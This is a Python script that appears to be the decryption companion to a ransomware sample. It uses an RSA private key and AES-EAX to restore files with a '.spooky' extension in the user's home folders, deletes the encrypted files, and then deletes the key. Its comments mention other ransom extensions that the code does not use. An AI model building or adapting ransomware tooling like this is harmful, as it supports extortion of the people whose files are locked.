import os
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import sys

def decrypt_files():          
    current_directory = os.getcwd()
    search_directory = current_directory  # This will now search in the current directory using its absolute path
    # List all files in the search_directory
    files = os.listdir(search_directory)
    
    # Iterate over the files and filter the ones that end with "_public.pem" or "_private.pem"
    for file in files:
        full_path = os.path.join(search_directory, file)
        if file.endswith("_private.pem"):
            privateKeyFile = file
            

    def scanRecurse(baseDir):
        '''
        Scan a directory and return a list of all files
        return: list of files
        '''
        for entry in os.scandir(baseDir):
            if entry.is_file():
                yield entry
            else:
                yield from scanRecurse(entry.path)


    def decrypt(dataFile, privateKeyFile):
        '''
        use EAX mode to allow detection of unauthorized modifications
        '''

        # read private key from file
        ransomExtension = dataFile.suffix.lower()
        with open(privateKeyFile, 'rb') as f:
            privateKey = f.read()
            # create private key object
            key = RSA.import_key(privateKey) 

        # read data from file
        with open(dataFile, 'rb') as f:
            # read the session key
            encryptedSessionKey, nonce, tag, ciphertext = [ f.read(x) for x in (key.size_in_bytes(), 16, 16, -1) ]

        # decrypt the session key
        cipher = PKCS1_OAEP.new(key)
        sessionKey = cipher.decrypt(encryptedSessionKey)
        
        # Extract the extension_length from the first byte of the ciphertext
        extension_length = int.from_bytes(ciphertext[0:1], 'big')
        # Extract the extension using the extension_length
        extension = ciphertext[1:1+extension_length].decode()
        # Remove the extension_length and extension bytes from the ciphertext
        ciphertext = ciphertext[1+extension_length:]

        # decrypt the data with the session key
        cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)

        # save the decrypted data to file
        dataFile = str(dataFile)
        print(dataFile)
        fileName = dataFile.split(ransomExtension)[0]
        print(fileName)
        #fileExtension = '.decrypted' # mark the file was decrypted
        decryptedFile = fileName + extension
        
        with open(decryptedFile, 'wb') as f:
            f.write(data)
            
        os.remove(dataFile)

        print('Decrypted file saved to ' + decryptedFile)
    
    username = os.environ.get('USER')
    directories = [f'/home/{username}/testfiles',f'/home/{username}/Documents',f'/home/{username}/Music',f'/home/{username}/Pictures',f'/home/{username}/Videos']

    # because we need to decrypt file focus on .L0v3sh3 extension here is the code
    includeExtension = ['.spooky'] # CHANGE THIS make sure all is lower case
    try:
        for directory in directories:
            for item in scanRecurse(directory): 
                filePath = Path(item)
                fileType = filePath.suffix.lower()
                # run the decryptor just if the extension is .pwned
                if fileType in includeExtension:
                  #print(Path(filePath)) # testing the scanning file
                  decrypt(filePath, privateKeyFile)
                  
        files = os.listdir(search_directory)

        # Iterate over the files and filter the ones that end with "_public.pem" or "_private.pem"
        for file in files:
            full_path = os.path.join(search_directory, file)
            if file.endswith("_private.pem"):
                os.remove(file)

        return True
    except Exception as e:
        print(f"Error during decrpytion: {e}")
        return False
        
if __name__ == '__main__':
    decrypt_files()
